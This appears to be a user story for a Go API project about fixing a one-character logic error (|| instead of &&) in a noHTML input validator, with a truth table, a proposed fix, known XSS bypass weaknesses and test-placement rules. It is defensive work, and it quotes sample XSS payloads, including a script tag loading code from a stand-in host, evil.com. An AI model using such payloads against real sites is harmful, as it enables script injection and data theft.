# US-38.5: Fix noHTML Validator Logic Error

## Summary

The `validateNoHTML` custom validator in `api/internal/middleware/validation.go:351` uses `||` (OR) instead of `&&` (AND), making it possible for strings containing a `<` without a matching `>` to pass validation. This is a one-character fix with significant security implications.

## Current Problem

### The Buggy Code

`api/internal/middleware/validation.go:351`:

```go
func validateNoHTML(fl validator.FieldLevel) bool {
    field := fl.Field()
    if field.Kind() != reflect.String {
        return true
    }
    value := field.String()
    return !strings.Contains(value, "<") || !strings.Contains(value, ">")  // buggy
}
```

### Why This Is Wrong

The function returns `true` (passes validation) when EITHER condition is true:
- `!strings.Contains(value, "<")` — value does NOT contain `<`
- `!strings.Contains(value, ">")` — value does NOT contain `>`

Using De Morgan's Law, this is equivalent to: `!(strings.Contains(value, "<") && strings.Contains(value, ">"))` — the value passes unless it contains BOTH `<` AND `>`.

**This means the following strings ALL pass validation:**

| Input | Contains `<` | Contains `>` | `!has<` | `!has>` | `!has< \|\| !has>` | Passes? | Should Pass? |
|---|---|---|---|---|---|---|---|
| `<script>alert(1)` | Yes | No | false | true | true | YES | NO |
| `<img src=x onerror=alert(1)` | Yes | No | false | true | true | YES | NO |
| `<div` | Yes | No | false | true | true | YES | NO |
| `Hello world` | No | No | true | true | true | YES | YES |
| `<b>bold</b>` | Yes | Yes | false | false | false | NO | NO |
| `1 > 2` | No | Yes | true | false | true | YES | NO* |

(*`>` alone may or may not be a concern depending on context, but the intent is clearly to reject ANY angle bracket.)

### Attack Scenario

An attacker submits `<script src=https://evil.com/payload.js` (no closing `>`) in a field validated by `noHTML`. The validator returns `true`, the input is stored, and when rendered in a browser, the browser's HTML parser may interpret the unclosed tag depending on surrounding context. While modern browsers are somewhat resilient to unclosed tags, this is still a bypass of the intended validation.

### The Correct Logic

The function should return `true` ONLY when the value contains NEITHER `<` NOR `>`:

```go
func validateNoHTML(fl validator.FieldLevel) bool {
    field := fl.Field()
    if field.Kind() != reflect.String {
        return true
    }
    value := field.String()
    return !strings.Contains(value, "<") && !strings.Contains(value, ">")  // fixed
}
```

With `&&`, the function returns `true` (passes) only when BOTH:
- The value does NOT contain `<`
- The value does NOT contain `>`

## Weaknesses

The following weaknesses are explicitly documented for awareness:

### 1. Validator Only Checks Literal ASCII `<` and `>`

The `validateNoHTML` check catches angle brackets but does **not** catch:

- **HTML entities**: `&lt;` and `&#60;` are not caught and may render as `<` in HTML context
- **`javascript:` URLs**: `javascript:alert(1)` passes validation (no angle brackets)
- **CSS expressions**: `expression(alert(1))` passes
- **Event handlers without angle brackets**: `onmouseover=alert(1)` passes if injected into an existing attribute context

**Known limitation**: `strings.Contains` is not comprehensive XSS prevention. CSP (Content Security Policy) is the primary defense layer. A future story should evaluate the `bluemonday` sanitizer for richer fields where user-supplied HTML or markdown might be acceptable. See also: the `strings.Contains` approach should not be treated as a security boundary on its own.

### 2. Validator Name "nohtml" Overpromises

The tag name `nohtml` implies "no HTML is allowed," but the implementation only checks for angle brackets. HTML entities, attribute injection, and protocol handlers are not covered. This is a **pre-existing naming issue**. Renaming the tag (e.g., to `noanglebrack`) would require updating every struct field that uses the `nohtml` tag across the codebase — see the Acceptance Criteria for a full inventory. The naming issue is documented here; a rename is a separate decision.

## Proposed Fix

### Primary Fix: Change `||` to `&&`

In `api/internal/middleware/validation.go:351`:

Change:
```go
return !strings.Contains(value, "<") || !strings.Contains(value, ">")
```
To:
```go
return !strings.Contains(value, "<") && !strings.Contains(value, ">")
```

This is a **one-character change** from `||` to `&&`.

### Secondary: Audit All Custom Validators

Read the entire `validation.go` file and audit every custom validator function for similar logic errors. Look for:
- Incorrect boolean operators (`||` vs `&&`)
- Off-by-one errors in length checks
- Missing null/empty string handling
- Inverted return values

Report any additional issues found as part of this story's implementation.

## Test Package Constraint

> **This section is critical. Read before writing any tests.**

`validateNoHTML` is an **unexported** function. Tests must be in a `_test.go` file with `package middleware` (an internal test file) to access it directly.

- **Correct**: A `_test.go` file in `api/internal/middleware/` with `package middleware` at the top can call `validateNoHTML` and register it with a local validator instance.
- **Wrong**: The existing test directory `api/internal/middleware/tests/` uses `package tests`, which is an **external package**. It **cannot** call `validateNoHTML` directly. Do not add tests for `validateNoHTML` there.

If you use the `setupValidator` helper pattern (registering `validateNoHTML` with a `validator.New()` instance), the test file **must** live in the same package (`package middleware`) as `validation.go`.

Alternatively, tests may use the production validator initialization function that sets up all custom validators (see `init()` at `validation.go:51-65`), then call `validate.Var()` through that globally initialized instance. This approach works from any package but depends on the production init path running before tests.

```go

```

Either approach is acceptable, but be consistent within the test file.

> **Warning:** Do not mix test approaches in the same file. The global `validate` instance at `validation.go:24` is package-level and shared across all tests; prefer the isolated `setupValidator` approach to avoid test pollution.
